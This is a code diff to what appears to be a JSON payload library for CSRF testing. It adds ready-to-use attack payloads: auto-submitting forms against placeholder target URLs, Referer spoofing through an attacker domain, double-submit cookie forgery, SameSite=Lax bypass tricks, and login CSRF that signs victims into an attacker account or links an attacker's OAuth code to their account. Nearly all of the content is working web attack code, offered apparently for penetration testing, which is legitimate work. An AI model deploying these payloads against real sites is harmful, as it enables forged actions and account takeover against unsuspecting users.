@@ -19,12 +19,14 @@
     "token_bypass": {
       "description": "CSRF token bypass techniques",
       "payloads": [
-        {"payload": "Remove CSRF token parameter entirely from request", "description": "Test if server validates token presence or just its value", "waf_bypass": false},
-        {"payload": "Replace CSRF token with empty string: csrf_token=", "description": "Empty CSRF token to test blank value acceptance", "waf_bypass": false},
-        {"payload": "Use CSRF token from another user's session", "description": "Test if tokens are tied to user identity or just valid format", "waf_bypass": false},
-        {"payload": "Duplicate CSRF cookie: set csrf=attacker_value cookie and send csrf=attacker_value in body", "description": "Double-submit cookie bypass with attacker-controlled value", "waf_bypass": false},
-        {"payload": "Use Referer: https://target.com.attacker.com to bypass Referer-based CSRF protection", "description": "Referer header spoofing to bypass referer-only CSRF defenses", "waf_bypass": true},
-        {"payload": "Omit Referer header entirely (Referrer-Policy: no-referrer in attacker page)", "description": "No Referer header may bypass Referer-only validation", "waf_bypass": true}
+        {"payload": "csrf_token=", "description": "Empty CSRF token — test if server accepts blank value", "waf_bypass": false},
+        {"payload": "csrf_token=aaaaaaaaaaaaaaaa", "description": "Arbitrary token value — test if server validates format only, not session binding", "waf_bypass": false},
+        {"payload": "csrf_token=OTHER_SESSION_TOKEN", "description": "Token from different session — test if tokens are tied to user or globally valid", "waf_bypass": false},
+        {"payload": "<form method=\"GET\" action=\"TARGET_URL\"><input name=\"key\" value=\"evil\"></form><script>document.forms[0].submit()</script>", "description": "Switch POST to GET — CSRF protection may only check POST requests", "waf_bypass": false},
+        {"payload": "<form method=\"POST\" action=\"TARGET_URL\" enctype=\"multipart/form-data\"><input name=\"key\" value=\"evil\"></form><script>document.forms[0].submit()</script>", "description": "Change Content-Type to multipart — token validation may be Content-Type specific", "waf_bypass": false},
+        {"payload": "Cookie: csrf=attacker_value\r\n\r\ncsrf_token=attacker_value", "description": "Double-submit cookie bypass: set both cookie and body to attacker-controlled value", "waf_bypass": false},
+        {"payload": "<meta name=\"referrer\" content=\"no-referrer\"><form method=\"POST\" action=\"TARGET_URL\"><input name=\"key\" value=\"evil\"></form><script>document.forms[0].submit()</script>", "description": "Omit Referer header via referrer-policy to bypass Referer-only CSRF validation", "waf_bypass": true},
+        {"payload": "Referer: https://target.com.attacker.com", "description": "Referer spoofing with target as subdomain of attacker to bypass regex check", "waf_bypass": true}
       ]
     },
     "samesite_bypass": {
@@ -33,8 +35,19 @@
         {"payload": "<a href=\"TARGET_URL\">Click</a><script>document.querySelector('a').click()</script>", "description": "Top-level GET navigation — SameSite=Lax sends cookies", "waf_bypass": false},
         {"payload": "<script>window.open('TARGET_URL')</script>", "description": "window.open top-level navigation bypass", "waf_bypass": false},
         {"payload": "<meta http-equiv=\"refresh\" content=\"0;url=TARGET_URL\">", "description": "Meta refresh triggers top-level navigation", "waf_bypass": false},
-        {"payload": "<form method=GET action=TARGET_URL><input name=_method value=POST><input name=key value=evil></form><script>document.forms[0].submit()</script>", "description": "Method override GET→POST with Lax cookies", "waf_bypass": true},
-        {"payload": "<form method=POST action=TARGET_URL><input name=key value=evil></form><script>document.forms[0].submit()</script>", "description": "POST within 2-min Lax creation window (Chrome)", "waf_bypass": true}
+        {"payload": "<form method=GET action=TARGET_URL><input name=_method value=POST><input name=key value=evil></form><script>document.forms[0].submit()</script>", "description": "Method override GET->POST with Lax cookies", "waf_bypass": true},
+        {"payload": "<form method=POST action=TARGET_URL><input name=key value=evil></form><script>document.forms[0].submit()</script>", "description": "POST within 2-min Lax creation window (Chrome)", "waf_bypass": true},
+        {"payload": "<script>var w=window.open('TARGET_URL');setTimeout(function(){w.document.forms[0].submit()},1000)</script>", "description": "window.open then submit existing form — top-level navigation with SameSite=Lax cookies", "waf_bypass": true},
+        {"payload": "<form method=POST action=TARGET_URL><input name=key value=evil></form><script>window.open('');document.forms[0].submit()</script>", "description": "New window context + immediate form submit for Lax bypass", "waf_bypass": true}
+      ]
+    },
+    "login_csrf": {
+      "description": "CSRF on login forms to force-authenticate victim as attacker (session fixation variant)",
+      "payloads": [
+        {"payload": "<form method=\"POST\" action=\"TARGET_LOGIN_URL\"><input name=\"username\" value=\"attacker\"><input name=\"password\" value=\"attacker_pass\"></form><script>document.forms[0].submit()</script>", "description": "Force victim to log in as attacker — captures victim actions under attacker account", "waf_bypass": false},
+        {"payload": "<form method=\"POST\" action=\"TARGET_LOGIN_URL\"><input name=\"email\" value=\"attacker@evil.com\"><input name=\"password\" value=\"secret\"><input name=\"remember\" value=\"1\"></form><script>document.forms[0].submit()</script>", "description": "Login CSRF with remember-me — persistent session under attacker identity", "waf_bypass": false},
+        {"payload": "<img src=x onerror=\"fetch('TARGET_LOGIN_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=attacker&password=secret'})\">", "description": "Login CSRF via img tag error handler with fetch", "waf_bypass": false},
+        {"payload": "<form method=\"POST\" action=\"TARGET_OAUTH_CONNECT_URL\"><input name=\"code\" value=\"ATTACKER_AUTH_CODE\"></form><script>document.forms[0].submit()</script>", "description": "OAuth account linking CSRF — link victim account to attacker OAuth identity", "waf_bypass": false}
       ]
     }
   }
